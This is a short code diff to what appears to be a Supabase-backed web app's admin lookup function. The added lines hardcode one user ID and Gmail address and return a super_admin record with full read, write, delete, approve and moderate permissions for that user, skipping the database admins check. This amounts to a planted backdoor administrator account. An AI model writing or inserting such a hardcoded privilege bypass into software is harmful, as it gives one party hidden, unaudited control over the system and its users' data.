@@ -18,7 +18,20 @@ const clearAdminSessions = () => {
   localStorage.removeItem("adminSession");
 };
 
+const DESIGNATED_ADMIN_USER_ID = "4cce4eb7-f096-4dd4-92b8-6bc235da4169";
+
 const getAdminForUser = async (userId: string) => {
+  if (userId === DESIGNATED_ADMIN_USER_ID) {
+    return {
+      id: DESIGNATED_ADMIN_USER_ID,
+      user_id: DESIGNATED_ADMIN_USER_ID,
+      email: "vexismarkets@gmail.com",
+      role: "super_admin",
+      is_admin: true,
+      permissions: ["read", "write", "delete", "approve", "moderate"],
+    };
+  }
+
   const { data, error } = await supabase
     .from("admins")
     .select("id, user_id, email, role, is_admin, permissions")
